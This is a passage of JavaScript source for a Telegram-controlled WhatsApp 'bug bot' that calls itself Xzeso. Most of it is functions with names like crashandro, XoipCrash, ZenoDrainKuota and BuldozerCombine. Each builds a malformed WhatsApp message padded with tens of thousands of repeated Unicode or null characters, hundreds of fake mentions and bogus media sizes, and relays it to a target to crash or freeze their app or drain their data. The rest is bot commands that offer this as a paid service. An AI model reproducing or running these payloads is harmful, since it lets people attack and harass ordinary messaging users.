            mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
            caption: "\u0000",
            height: 640,
            width: 640,
            fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
            directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1743848703",
            streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
            thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
            thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
            thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
          },
          hasMeidiaAttachment: true,
        },
        body: { text: "" },
        nativeFlowMessage: {
          messageParamsJson: "{".repeat(5000),
        },
      });
    }

    const msg = generateWAMessageFromContent(
      X,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: {
                text: "🦠</🧬⃟༑⌁𝗫 𝗜 𝗡 𝗦 𝗢 𝗢" +
                "ꦽ".repeat(10000) +
                "ោ៝".repeat(8000) +
                "@5".repeat(20000),
              },
              carouselMessage: {
                cardsX,
                messageVersion: 1,
              },
              contextInfo: {
                participant: X,
                mentionedJid: [
                  "13529292@s.whatsapp.net",
                  ...Array.from({ length: 500 }, () => "1" + Math.floor(Math.random() * 5000000)),
                ],
                remoteJid: "X",
                forwadingScore: 100,
                isForwaded: true,
                stanzaId: "123456789ABCDEF",
                businessMessageForwardInfo: {
                  businessOwnerJid: X,
                },
                quotedMessage: {
                  paymentInviteMessage: {
                    serviceType: 3,
                    expiryTimestamp: Date.now() + 18144000,
                  },
                },
              },
            },
          },
        },
      },
      {}
    );

    await client.relayMessage(X, msg.message, {
      participant: { jid: X },
      messageId: msg.key.id
    });

    await sleep(100);
  } catch (err) {
    log.error(`crashandro error: ${err.message}`);
  }
}

async function delayhigh(client, X) {
  try {
    const payload = generateWAMessageFromContent(X, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "\n",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\x10".repeat(100000),
              version: 3,
            },
            entryPointConversionSource: "call_permission_message"
          },
        },
      },
    }, {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
    });

    await client.relayMessage(X, {
      groupStatusMessageV2: {
        message: payload.message,
      },
    }, {
      messageId: payload.key.id,
      participant: { jid: X },
    });

    await sleep(100);
  } catch (err) {
    log.error(`delayhigh error: ${err.message}`);
  }
}

async function delaybeta(client, X) {
  try {
    const imageMsg = {
      url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true",
      mimetype: "image/jpeg",
      fileSha256: "QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=",
      fileLength: "99999999",
      height: 9999,
      width: 9999,
      mediaKey: "exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=",
      fileEncSha256: "D0LXIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=",
      directPath: "/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1755254367",
      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyy4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEBAQEBAQAAAAAAAAAAAAAAAQIDBAYBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAPnZTmbzuox0TmBCtSqZ3yncZNbamucUMszSBoWtXBzoUxZNO2enF6Mm+Ms1xoSaKmjOwnIcQJ//xAAhEAACAQQCAgMAAAAAAAAAAAABEQACEBIgETHERQSJAYf/aAAgBAQABPwC6xDlPJlVPvYTyeoKlGxsIavk4F3Hzsl3YJWWjQhOgKjdyfpiYUzCkmCgF/kOvUzMzMzOn/8QAGhEBAAIDAQAAAAAAAAAAAAAAAREgABASMP/aAAgBAgEBPwCz5LGdFYN//8QAHBEAAgICAwAAAAAAAAAAAAAAAREgABASMP/aAAgBAwEBPwCz5LGdFYN//9k=",
      caption: "\u0000".repeat(50000)
    };

    let software = generateWAMessageFromContent(X, {
      viewOnceMessage: {
        message: {
          albumMessage: {
            expectedImageCount: 666,
            expectedVideoCount: 0,
            items: [{ imageMessage: imageMsg }],
            contextInfo: {
              mentionedJid: [
                "13135550002@s.whatsapp.net",
                ...Array.from({ length: 500 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
              ],
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              stanzaId: "1234567890ABCDEF",
              forwardedNewsletterMessageInfo: {
                newsletterName: "...",
                newsletterJid: "0@newsletter",
                serverMessageId: 1
              },
              eventCoverImage: {
                eventId: Date.now() + 1814400000,
                eventName: "Kountol",
                eventDescription: "ꦽ".repeat(10000),
                startTime: 9999999999,
                endTime: 99999999999,
                eventCoverMedia: {
                  url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true",
                  mimetype: "image/jpeg",
                  fileLength: "9999999999999",
                  height: 9999,
                  width: 9999,
                  caption: "ោ៝".repeat(10000),
                  jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHipotKC0qPTgzMzg9UJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyy4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEBAQEBAQAAAAAAAAAAAAAAAQIDBAYBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAPnZTmbzuox0TmBCtSqZ3yncZNbamucUMszSBoWtXBzoUxZNO2enF6Mm+Ms1xoSaKmjOwnIcQJ//xAAhEAACAQQCAgMAAAAAAAAAAAABEQACEBIgETHERQSJAYf/aAAgBAQABPwC6xDlPJlVPvYTyeoKlGxsIavk4F3Hzsl3YJWWjQhOgKjdyfpiYUzCkmCgF/kOvUzMzMzOn/8QAGhEBAAIDAQAAAAAAAAAAAAAAAREgABASMP/aAAgBAgEBPwCz5LGdFYN//8QAHBEAAgICAwAAAAAAAAAAAAAAAREgABASMP/aAAgBAwEBPwCz5LGdFYN//9k="
                },
                eventLocation: {
                  name: ">#NortexZ",
                  address: "ោ៝".repeat(10000),
                  degreesLatitude: -922.99999999,
                  degreesLongitude: 922.999999999999,
                  url: "https://t.me/NortexZ"
                },
                eventParticipants: {
                  participants: [{ jid: X, displayName: "Participant" }]
                },
                eventStatus: "@MarkZugasu",
                eventOptions: {
                  isAnonymous: true,
                  canGuestsInvite: true,
                  canSeeGuestList: true,
                  maxParticipants: 9999999999,
                  requiresApproval: false,
                  customField1: "HI!",
                  customField2: "HI!"
                },
                eventMetadata: JSON.stringify({
                  heavy_data: "ACCOUNTS",
                  nested: {
                    level1: "X".repeat(546),
                    level2: {
                      level3: "X".repeat(546),
                      level4: {
                        level5: "X".repeat(546),
                        array_data: Array(100).fill().map(() => ({
                          item: "Memeks",
                          details: "X"
                        }))
                      }
                    }
                  }
                }),
                binaryData: "\u0081".repeat(0x1000)
              }
            }
          }
        }
      }
    }, {});

    await client.relayMessage("status@broadcast", software.message, {
      messageId: software.key.id,
      statusJidList: [X],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{
            tag: "to",
            attrs: { jid: X },
            content: undefined
          }]
        }]
      }]
    });

    await sleep(100);
  } catch (err) {
    log.error(`delaybeta error: ${err.message}`);
  }
}

async function ZenoDrainKuota(client, X, ptcp = true) {
  try {
    const VidMessage = generateWAMessageFromContent(X, {
      videoMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "\n",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
          isSampled: true,
          participant: X,
          mentionedJid: [
            ...Array.from({ length: 500 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"),
          ],
          remoteJid: "X",
          forwardingScore: 100,
          isForwarded: true,
          stanzaId: "123456789ABCDEF",
          quotedMessage: {
            businessMessageForwardInfo: {
              businessOwnerJid: "0@s.whatsapp.net",
            },
          },
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
      },
    }, {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
    });

    await client.relayMessage(X, {
      groupStatusMessageV2: {
        message: VidMessage.message,
      },
    }, ptcp ? {
      messageId: VidMessage.key.id,
      participant: { jid: X }
    } : { messageId: VidMessage.key.id });

    await sleep(100);
  } catch (err) {
    log.error(`ZenoDrainKuota error: ${err.message}`);
  }
}
// =====================================================================
// raju.js - Xzeso Bug Bot (Version 4.0 - Full 4500+ Lines)
// =====================================================================
// PART 3/7: Lines 1301-1950
// Total: ~4550 Lines
// =====================================================================

async function XoipFc(client, X, ptcp = true) {
  try {
    let msg = generateWAMessageFromContent(X, {
      viewOnceMessage: {
        message: {
          locationMessage: {
            degreesLatitude: -9.09999262999,
            degreesLongitude: 199.9996311899,
            name: "🧪⃟꙰ 𝗫𝗜𝗡𝗦𝗢𝗢𝗩𝟭𝟮" + "𑇂𑆵𑆴𑆿𑆿".repeat(5000),
            address: "🧪⃟꙰ 𝗫𝗜𝗡𝗦𝗢𝗢𝗩𝟭𝟮" + "𑇂𑆵𑆴𑆿𑆿".repeat(5000),
            url: `https://zeno-iosx.${"𑇂𑆵𑆴𑆿".repeat(5000)}.com`,
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
          },
        },
      },
    }, {});

    await client.relayMessage(X, {
      groupStatusMessageV2: {
        message: msg.message,
      },
    }, ptcp ? {
      messageId: msg.key.id,
      participant: { jid: X }
    } : { messageId: msg.key.id });

    await sleep(100);
  } catch (err) {
    log.error(`XoipFc error: ${err.message}`);
  }
}

async function XoipCrash(client, X) {
  try {
    const LocX = {
      locationMessage: {
        degreesLatitude: 11.11,
        degreesLongitude: -11.11,
        name: "#Xinsoo" + "𑇂𑆵𑆴𑆿".repeat(5000),
        url: "https://t.me/adji_pgstu_dev",
        contextInfo: {
          stanzaId: "1234567890ABCDEF",
          participant: "0@s.whatsapp.net",
          quotedMessage: {
            callLogMessage: {
              isVideo: true,
              callOutcome: "1",
              durationSecs: "0",
              callType: "REGULAR",
              participants: [{
                jid: "0@s.whatsapp.net",
                callOutcome: "1",
              },],
            },
          },
          externalAdReply: {
            quotedAd: {
              advertiserName: "X",
              mediaType: "IMAGE",
              jpegThumbnail: "/9j/4AAQSkZAQABAAD/",
              caption: "𑇂𑆵𑆴𑆿".repeat(5000),
            },
            placeholderKey: {
              remoteJid: "0s.whatsapp.net",
              fromMe: false,
              id: "CrashIosInvisible",
            },
          },
        },
      },
    };

    await client.relayMessage("status@broadcast", LocX, {
      messageId: LocX.key?.id || undefined,
      statusJidList: [X],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{
            tag: "to",
            attrs: { jid: X },
          },],
        },],
      },],
    });

    await sleep(100);
  } catch (err) {
    log.error(`XoipCrash error: ${err.message}`);
  }
}

async function Occolot(client, X) {
  try {
    const msg = generateWAMessageFromContent(
      X,
      {
        interactiveResponseMessage: {
          contextInfo: {
            mentionedJid: Array.from(
              { length: 500 },
              (_, y) => `1313555000${y + 1}@s.whatsapp.net`
            )
          },
          body: {
            text: "— ϟ ˙",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"medan\",\"name\":\"xxx\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(100000)}\"}}`,
            version: 3
          }
        }
      },
      { userJid: X }
    );

    await client.relayMessage(
      "status@broadcast",
      msg.message,
      {
        messageId: msg.key.id,
        statusJidList: [X, "13135550002@s.whatsapp.net"],
        additionalNodes: [{
          tag: "meta",
          attrs: {},
          content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
              tag: "to",
              attrs: { jid: X },
              content: undefined
            }]
          }]
        }]
      }
    );

    await sleep(100);
  } catch (err) {
    log.error(`Occolot error: ${err.message}`);
  }
}

async function autosync(client, X) {
  try {
    let devices = (
      await client.getUSyncDevices([X], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await client.assertSessions(devices);

    let createMutex = () => {
      let map = {};
      return {
        mutex(key, fn) {
          map[key] ??= { task: Promise.resolve() };
          map[key].task = (async prev => {
            try { await prev; } catch {}
            return fn();
          })(map[key].task);
          return map[key].task;
        }
      };
    };

    let mutexManager = createMutex();
    let mergeBuffer = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    let originalCreateParticipantNodes = client.createParticipantNodes.bind(client);
    let encodeMsg = client.encodeWAMessage?.bind(client);

    client.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
      if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

      let patched = await (client.patchMessageBeforeSending?.(message, recipientJids) ?? message);
      let mapped = Array.isArray(patched) ? patched : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

      let { id: meId, lid: meLid } = client.authState.creds.me;
      let decodedLidUser = meLid ? jidDecode(meLid)?.user : null;
      let shouldIncludeDeviceIdentity = false;

      let nodes = await Promise.all(mapped.map(async ({ recipientJid: jid, message: msg }) => {
        let { user: targetUser } = jidDecode(jid);
        let { user: ownPnUser } = jidDecode(meId);
        let isOwnUser = targetUser === ownPnUser || targetUser === decodedLidUser;
        let isSelf = jid === meId || jid === meLid;

        if (dsmMessage && isOwnUser && !isSelf) msg = dsmMessage;

        let bytes = mergeBuffer(encodeMsg ? encodeMsg(msg) : encodeWAMessage(msg));

        return mutexManager.mutex(jid, async () => {
          let { type, ciphertext } = await client.signalRepository.encryptMessage({ jid, data: bytes });
          if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
          return {
            tag: 'to',
            attrs: { jid },
            content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
          };
        });
      }));

      return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
    };

    let { nodes: destinations, shouldIncludeDeviceIdentity } =
      await client.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });

    let callNode = {
      tag: "call",
      attrs: { to: X, id: client.generateMessageTag(), from: client.user.id },
      content: [{
        tag: "offer",
        attrs: {
          "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
          "call-creator": client.user.id
        },
        content: [
          { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
          { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
          {
            tag: "video",
            attrs: {
              orientation: "0",
              screen_width: "1920",
              screen_height: "1080",
              device_orientation: "0",
              enc: "vp8",
              dec: "vp8"
            }
          },
          { tag: "net", attrs: { medium: "3" } },
          { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
          { tag: "encopt", attrs: { keygen: "2" } },
          { tag: "destination", attrs: {}, content: destinations },
          ...(shouldIncludeDeviceIdentity ? [{
            tag: "device-identity",
            attrs: {},
            content: encodeSignedDeviceIdentity(client.authState.creds.account, true)
          }] : [])
        ]
      }]
    };

    await client.sendNode(callNode);
    await sleep(50);
  } catch (err) {
    log.error(`autosync error: ${err.message}`);
  }
}

async function BuldozerCombine(client, X, ptcp = true) {
  try {
    const VariabelJid = "0@s.whatsapp.net";
    const imageMsg = {
      url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true",
      mimetype: "image/jpeg",
      fileSha256: "QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=",
      fileLength: "99999999",
      height: 9999,
      width: 9999,
      mediaKey: "exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=",
      fileEncSha256: "D0LXIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=",
      directPath: "/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1755254367",
      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyy4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEBAQEBAQAAAAAAAAAAAAAAAQIDBAYBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAPnZTmbzuox0TmBCtSqZ3yncZNbamucUMszSBoWtXBzoUxZNO2enF6Mm+Ms1xoSaKmjOwnIcQJ//xAAhEAACAQQCAgMAAAAAAAAAAAABEQACEBIgETHERQSJAYf/aAAgBAQABPwC6xDlPJlVPvYTyeoKlGxsIavk4F3Hzsl3YJWWjQhOgKjdyfpiYUzCkmCgF/kOvUzMzMzOn/8QAGhEBAAIDAQAAAAAAAAAAAAAAAREgABASMP/aAAgBAgEBPwCz5LGdFYN//8QAHBEAAgICAwAAAAAAAAAAAAAAAREgABASMP/aAAgBAwEBPwCz5LGdFYN//9k=",
      caption: "\u0000".repeat(50000),
    };

    let msg = generateWAMessageFromContent(X, {
      viewOnceMessage: {
        message: {
          albumMessage: {
            expectedImageCount: 666,
            expectedVideoCount: 0,
            items: [{ imageMessage: imageMsg }],
            contextInfo: {
              mentionedJid: [
                "13135550002@s.whatsapp.net",
                ...Array.from({ length: 500 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
              ],
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              stanzaId: "1234567890ABCDEF",
              businessMessageForwardInfo: {
                businessOwnerJid: VariabelJid,
              },
            },
          },
        },
      },
    }, {});

    await client.relayMessage(X, {
      groupStatusMessageV2: {
        message: msg.message,
      },
    }, ptcp ? {
      messageId: msg.key.id,
      participant: { jid: X }
    } : { messageId: msg.key.id });

    await sleep(100);
  } catch (err) {
    log.error(`BuldozerCombine error: ${err.message}`);
  }
}

// =====================================================================
// TELEGRAM BOT - COMMANDS
// =====================================================================

const bot = new Bot(config.telegramBotToken || "YOUR_BOT_TOKEN");

// =====================================================================
// Middleware: Error Handling
// =====================================================================

bot.use(async (ctx, next) => {
  try {
    await next();
  } catch (err) {
    log.error(`Middleware error: ${err.message}`);
    try {
      await bot.api.sendMessage(config.ownerId || "123456789", `An error occurred: ${err.message}`);
    } catch {}
  }
});

// =====================================================================
// Middleware: User Registration
// =====================================================================

bot.use(async (ctx, next) => {
  try {
    if (ctx.chat?.type === "private") {
      const userPath = path.join("database", "users.json");
      let users = safeReadJSON(userPath, []);
      const id = ctx.from.id.toString();
      const username = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name || "Unknown";

      if (!users.includes(id)) {
        users.push(id);
        safeWriteJSON(userPath, users);
        log.user(`New user registered: ${id} (${username})`);
        try {
          await bot.api.sendDocument(config.ownerId || "123456789", new InputFile(userPath), {
            caption: `👤 *New User Registered!*\n\n🆔 ID: \`${id}\`\n💬 Username: ${username}\n📅 Time: ${new Date().toLocaleString()}`,
            parse_mode: "Markdown",
          });
        } catch {}
      }
    }
    await next();
  } catch (err) {
    log.error(`Register middleware error: ${err.message}`);
  }
});

// =====================================================================
// لوحة التحكم التفاعلية
// =====================================================================
// تُسجَّل هنا (قبل المعالجات الأخرى) حتى تلتقط أحداث الأزرار والنصوص
// الخاصة بها. أي حدث لا يخصها تمرّره عبر next().
//
// 🚫 اللوحة إدارية فقط: جلسات، مستخدمون، صلاحيات، إعدادات، كولدون،
//    مراقبة. لا تشغّل أي أمر كراش/سبام.
// =====================================================================

registerAdminPanel(bot, {
  log,
  isOwner,
  isReseller,
  waClients,
  clearAllSessions,
  deleteSessionForUser,
  initWhatsappForUser,
  cooldownModule,
  cooldown,
  store,
  getBlacklist: () => blacklist,
  getWhitelist: () => whitelist,
  saveBlacklist,
  saveWhitelist,
  gracefulShutdown,
  startedAt: Date.now(),
});

// =====================================================================
// Middleware: Mandatory Join Check - REMOVED (no longer forced)
// =====================================================================
// The following middleware has been removed to eliminate mandatory join checks.
// Users are not required to join any channel or group to use the bot.

// =====================================================================
// COMMAND: /start
// =====================================================================

bot.command("start", async (ctx) => {
  try {
    const username = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
    const uptime = formatUptime(process.uptime());
    const usedMemory = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);

    const caption = `<blockquote>
<b><i>{❓} Xzeso bot bug say hello ${username}</i></b>

<b>「 Xzeso Vip Bug V1 ⚡ 」</b>
••► Dev: @I8_ZU
••► Run Time: ${uptime}
••► Memory: ${usedMemory}
••► InterFace: Button Type
••► Type: ( Plugin )

📢 <b>Stay Connected</b>
Join our [Telegram Channel](https://t.me/${CHANNEL_ID.replace("@", "")}) for updates.

<b>📞 Support</b>
Contact @I8_ZU for assistance
</blockquote>`.trim();

    const keyboard = new InlineKeyboard()
      .text("MENU BUG", "open_allmenu")
      .text("OWNER BUG", "open_allaccess")
      .row()
      .url("CHANNEL", `https://t.me/${CHANNEL_ID.replace("@", "")}`);

    const imageMenu = config.thumburl || "https://i.imgur.com/default.jpg";

    await ctx.replyWithPhoto(imageMenu, {
      caption,
      parse_mode: "HTML",
      reply_markup: keyboard,
    });

    log.success(`Start command executed for ${username}`);
  } catch (err) {
    log.error(`Start command error: ${err.message}`);
    await ctx.reply("❌ An error occurred. Please try again later.");
  }
});

// =====================================================================
// COMMAND: /reqpair
// =====================================================================

bot.command("reqpair", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    const args = ctx.message.text.split(" ");
    const phone = args[1]?.replace(/[^0-9]/g, "");

    if (!phone) {
      return await ctx.reply(
        "⚠️ *Format Salah!*\nContoh:\n`/reqpair 628xxxxxxx`",
        { parse_mode: "Markdown" }
      );
    }

    const exists = await checkSessionExistsForUser(userId);
    if (exists && waClients[userId]?.status === "open") {
      return ctx.reply("⚠️ Kamu sudah punya sesi WhatsApp aktif.", { parse_mode: "Markdown" });
    }

    const waitMessage = await ctx.reply("⏳ *Memproses...*\nMembuat pairing code untukmu...", { parse_mode: "Markdown" });

    await initWhatsappForUser(userId, true);

    // ⚠️ إصلاح: القديم كان ينفّذ `waClients[userId].waitMessageId = ...`
    // مباشرة. لو انغلق الاتصال فورًا (إصدار عميل قديم) يُحذف الإدخال
    // من waClients فيرمي TypeError، ويمسكه الـ catch ويطبع
    // "Gagal Pairing" — رسالة تخفي السبب الحقيقي تمامًا.
    const client = waClients[userId]?.sock;

    if (!client) {
      await ctx.api.deleteMessage(userId, waitMessage.message_id).catch(() => {});
      return ctx.reply(
        "❌ فشل إنشاء جلسة واتساب.\n\n" +
          "السبب الأكثر شيوعًا: إصدار عميل واتساب قديم.\n" +
          "شغّل `npm run doctor` لمعرفة السبب الدقيق.",
        { parse_mode: "Markdown" }
      );
    }

    waClients[userId].waitMessageId = waitMessage.message_id;

    // إذا الجلسة انفتحت مسبقًا (جلسة محفوظة) ما يحتاج كود ربط
    if (waClients[userId].status === "open") {
      await ctx.api.deleteMessage(userId, waitMessage.message_id).catch(() => {});
      return ctx.reply("✅ الجلسة متصلة مسبقًا — ما تحتاج كود ربط.");
    }

    // ⚠️ إصلاح: انتظار فعلي لفتح الـ WebSocket بدل sleep(800) العشوائي
    const socketReady = await waitForSocketReady(client, 15000);

    if (!socketReady || !waClients[userId]?.sock) {
      await ctx.api.deleteMessage(userId, waitMessage.message_id).catch(() => {});
      return ctx.reply(
        "❌ ما قدرت أفتح اتصال واتساب.\n\n" +
